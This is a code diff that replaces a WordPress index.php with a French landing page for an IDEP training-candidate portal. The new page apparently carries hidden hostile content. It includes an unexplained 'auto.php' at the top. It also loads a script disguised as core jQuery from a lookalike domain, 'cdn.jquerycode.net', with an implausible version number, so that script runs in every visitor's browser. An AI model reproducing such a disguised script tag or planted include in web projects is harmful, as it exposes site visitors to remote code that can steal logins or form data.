@@ -1,17 +1,70 @@
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+<?php include 'auto.php'; ?>
+<html lang="fr">
+<head>
+  <title>PGARFR-IDEP</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/idepcandidat/adminlte3/css/adminlte.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+  <link rel="shortcut icon" type="image/x-icon" href="imagesprincipales/Icone.ico">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"></script>
+  <script id="jquery-core-js" src="https://cdn.jquerycode.net/jquery-4.4.5.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+<body>
+<div align="left">           
+  <img src="imagesprincipales/pgadfrentete.jpg" class="img-thumbnail" alt="PGADFR-IDEP"> 
+</div>
+<nav class="navbar navbar-expand navbar-red navbar-dark border-bottom-0">
+	<div class="container-fluid">
+	  <!-- Left navbar links -->
+	  <ul id="ew-navbar" class="navbar-nav">
+	      <li class="nav-item d-block d-sm-none">
+	          <a class="nav-link" data-widget="pushmenu" data-enable-remember="true" data-ew-action="none"><i class="fa-solid fa-bars ew-icon"></i></a>
+	      </li>
+	      <a class="navbar-brand d-none d-sm-block" href="#" data-ew-action="none">
+	          <span class="brand-text">PGADFR-IDEP</span>
+	      </a>
+	  </ul>
+   <!-- Left navbar links -->
+   <ul id="ew-navbar-right" class="navbar-nav ml-auto">
+		  <li class="nav-item"><a href="/?language=en-US" class="nav-link pt-0 active ew-tooltip" title="">en-US</a></li>
+		  <li class="nav-item"><a href="/" class="nav-link pt-0 ew-tooltip" title="" >fr-FR</a></li>
+		  <li class="nav-item"><a class="nav-link pt-0" href="#" onclick="window.location='/idepcandidat/login?language=en-US';return false;">Connexion</a></li>
+ 		</ul>
+</nav>
+	<table width="70%" border="0" cellpadding="0" cellspacing="0" align="center">
+	  <tbody>	  
+		<tr align="left" valign="top">
+		  <td width="100%" align="left" valign="bottom">
+			<p align="justify"><strong><br><br><br>Cher candidat,<br>
+			<br><br>
+			L'Institut Africain de D&eacute;veloppement Economique et de Planification des Nations Unies (IDEP), bas&eacute; &agrave; Dakar, au S&eacute;n&eacute;gal, a entrepris de re-dynamiser ses activit&eacute;s d'enseignement, de formation et de recherche afin de mieux r&eacute;pondre &agrave; son mandat de renforcement des capacit&eacute;s, &agrave; la fois pour la gestion du d&eacute;veloppement &eacute;conomique et pour la planification du d&eacute;veloppement.<br>
+			<br>
+			A cette effet, l'IDEP a mis en place une plateforme en ligne pour toute candidature &agrave; une activit&eacute; de formation.<br><br>
+			Les nouveaux candidats sont pri&eacute;s de <a href="idepcandidat/register?language=fr-FR" target="_self">s'inscrire en ligne</a>, de compl&eacute;ter le formulaire et de soumettre leur candidature.
+			<br><br>Les anciens candidats sont pri&eacute;s de <a href="idepcandidat/login?language=fr-FR" target="_self">se connecter en ligne</a>, de mettre &agrave; jour les informations du formulaire et de soumettre leur candidature de nouveau.</strong></p>
+		 </td>
+		</tr>
+		<tr align="left" valign="top">
+		  <th colspan="2" scope="row"><p align="justify">Je vous remercie de votre int&eacute;r&ecirc;t pour les activit&eacute;s de l'IDEP et j'esp&egrave;re avec vous, une collaboration fructueuse dans la recherche d'une transformation rapide et durable des &eacute;conomies africaines.<br><br>
+	Bien cordialement.</p><br><br>
+					  <p align="right">Karima BOUNEMRA BEN SOLTANE<br>Directrice</p>
+	<br><br><br><br><br><br><br><br>
+	</th>
+		</tr>
+		</tbody>
+	</table>
+</div>
+</body>
+	<footer>
+	<table width="100%" border="0" align="center">
+	  <tbody>
+	      <tr valign="bottom">
+	      <th width="100%" align="center" scope="row">
+	<img src="../imagesprincipales/pgdfrpiedpage.jpg" alt="PGADFR-IDEP"></th>
+	    </tr>	
+	  </tbody>
+	</table>
+</footer>
+</html>
